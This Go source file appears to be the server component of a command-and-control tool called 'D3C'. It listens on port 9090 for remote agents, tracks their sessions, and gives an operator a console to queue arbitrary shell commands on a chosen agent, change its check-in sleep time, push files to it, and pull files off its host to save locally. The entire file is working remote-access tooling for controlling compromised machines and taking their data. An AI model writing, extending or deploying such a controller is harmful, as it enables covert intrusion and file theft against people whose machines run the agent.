package main

import (
	"bufio"
	"d3c/commons/helpers"
	"d3c/commons/structs"
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

var (
	agents          []structs.Message
	agentSelected   structs.Message
	sessionSelected string
	sessionCount    int = 0
)

func main() {
	log.Println("Start Server")
	go start("9090") // Execute it in another thread
	cliHandler()
}

func cliHandler() {
	for {
		showPrompt()

		fullCommand, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		commandParts := helpers.SplitCommand(fullCommand)
		cmd := strings.TrimSpace(commandParts[0])

		if len(cmd) > 0 {
			switch cmd {
			case "show":
				showHandler(commandParts)
			case "sleep":
				setSleep(fullCommand)
			case "select":
				selectHandler(commandParts)
			case "send":
				sendFile(commandParts)
			case "get":
				getFile(fullCommand)

			default:
				if agentSelected.AgentId != "" {
					command := &structs.Command{}
					command.Cmd = fullCommand

					for index, agent := range agents {
						if agent.AgentId == agentSelected.AgentId {
							agents[index].Commands = append(agents[index].Commands, *command)
						}
					}
				} else {
					println("Command not exists!")
				}
			}
		}
	}
}

func setSleep(command string) {
	commandParts := helpers.SplitCommand(command)

	if len(commandParts) <= 1 {
		fmt.Println("Define a sleep time")
		return
	}

	if agentSelected.AgentId == "" {
		fmt.Println("Select a agent")
		return
	}

	cmd := &structs.Command{}
	cmd.Cmd = command

	agents[getAgentIndex(agentSelected.AgentId)].Commands = append(agents[getAgentIndex(agentSelected.AgentId)].Commands, *cmd)
}

func getFile(command string) {
	var err error

	commandParts := helpers.SplitCommand(command)

	if len(commandParts) <= 1 {
		fmt.Println("Select a file to get")
		return
	}

	if agentSelected.AgentId == "" {
		fmt.Println("Select a agent")
		return
	}

	cmdSend := &structs.Command{}
	cmdSend.Cmd = command
	cmdSend.File = structs.File{}
	cmdSend.File.Name = commandParts[1]

	if err != nil {
		log.Println(err.Error())
	} else {
		agents[getAgentIndex(agentSelected.AgentId)].Commands = append(agents[getAgentIndex(agentSelected.AgentId)].Commands, *cmdSend)
	}
}

func sendFile(commandParts []string) {
	var err error

	if len(commandParts) <= 1 {
		fmt.Println("Select a file to send")
		return
	}

	if agentSelected.AgentId == "" {
		fmt.Println("Select a agent")
		return
	}

	cmdSend := &structs.Command{}
	cmdSend.Cmd = commandParts[0]
	cmdSend.File = structs.File{}
	cmdSend.File.Name = commandParts[1]
	cmdSend.File.Content, err = os.ReadFile(cmdSend.File.Name)

	if err != nil {
		log.Println(err.Error())
	} else {
		agents[getAgentIndex(agentSelected.AgentId)].Commands = append(agents[getAgentIndex(agentSelected.AgentId)].Commands, *cmdSend)
	}
}

func showPrompt() {
	if agentSelected.AgentId != "" {
		print("@D3C#", agentSelected.SessionId, "> ")
	} else {
		print("D3C> ")
	}
}

func getAgentBySessionId(sessionId string) (agentReturn structs.Message) {
	for _, agent := range agents {
		if sessionId == agent.SessionId {
			agentReturn = agent
			break
		}
	}
	return agentReturn
}

func showHandler(command []string) {
	if len(command) > 1 {
		switch command[1] {
		case "agents":
			for _, agent := range agents {
				println("SessionID:", agent.SessionId, "AgentID:", agent.AgentId, "->", agent.AgentHostName, "@", agent.AgentCWD)
			}
		default:
			println("show agents")
		}
	} else {
		println("show agents")
	}
}

func selectHandler(command []string) {
	if len(command) > 1 {
		if agentExist(command[1]) {
			agentSelected = getAgentBySessionId(command[1])
			println("Session", agentSelected.SessionId, "selected")
		} else {
			println("Session not exists")
		}
	} else {
		agentSelected = structs.Message{}
		println("CMD: select <session id>")
	}
}

func agentExist(sessionId string) (exists bool) {
	exists = false
	for _, agent := range agents {
		if sessionId == agent.SessionId {
			exists = true
			break
		}
	}
	return exists
}

func start(port string) {
	// tcp -> 0.0.0.0:9090
	listener, error := net.Listen("tcp", "0.0.0.0:"+port)

	if error != nil {
		log.Fatal("Error to start listener", error.Error())
	} else {
		for {
			channel, error := listener.Accept()
			defer channel.Close()

			if error != nil {
				log.Println("Error to open channel", error.Error())
			} else {
				message := &structs.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Check if agent id exists
				if agentExists(message.AgentId) {
					if hasMessageResponse(*message) {
						println("")
						// Show response
						for index, command := range message.Commands {
							log.Println("HOST", message.AgentHostName, "CMD:", command.Cmd)
							println(command.Response)

							if helpers.SplitCommand(command.Cmd)[0] == "get" && !message.Commands[index].File.Error {
								saveFile(message.Commands[index].File)
							}
						}

						showPrompt()
					}

					// Send command list to agent
					gob.NewEncoder(channel).Encode(agents[getAgentIndex(message.AgentId)])

					// Clear agent command list
					agents[getAgentIndex(message.AgentId)].Commands = []structs.Command{}

				} else {
					sessionCount = sessionCount + 1
					message.SessionId = strconv.Itoa(sessionCount)
					agents = append(agents, *message)

					log.Println("New connection:", channel.RemoteAddr().String())
					log.Println("SessionId:", message.SessionId, "AgentID:", message.AgentId)
					showPrompt()
					gob.NewEncoder(channel).Encode(message)
				}
			}
		}
	}
}

func saveFile(file structs.File) (response string) {
	response = "File send success!"

	path, _ := os.Getwd()
	name := filepath.Base(file.Name)
	fileName := filepath.Join(path, name)

	var err = os.WriteFile(fileName, file.Content, 0644)
	if err != nil {
		response = "Error saving file " + file.Name + " " + err.Error()
	}
	return response
}

func getAgentIndex(agentId string) (position int) {
	for index, agent := range agents {
		if agentId == agent.AgentId {
			position = index
			break
		}
	}
	return position
}

func agentExists(agentId string) (exists bool) {
	exists = false

	for _, agent := range agents {
		if agentId == agent.AgentId {
			exists = true
		}
	}

	return exists
}

func hasMessageResponse(message structs.Message) (exists bool) {
	exists = false

	for _, cmd := range message.Commands {
		if len(cmd.Response) > 0 {
			exists = true
		}
	}

	return exists
}
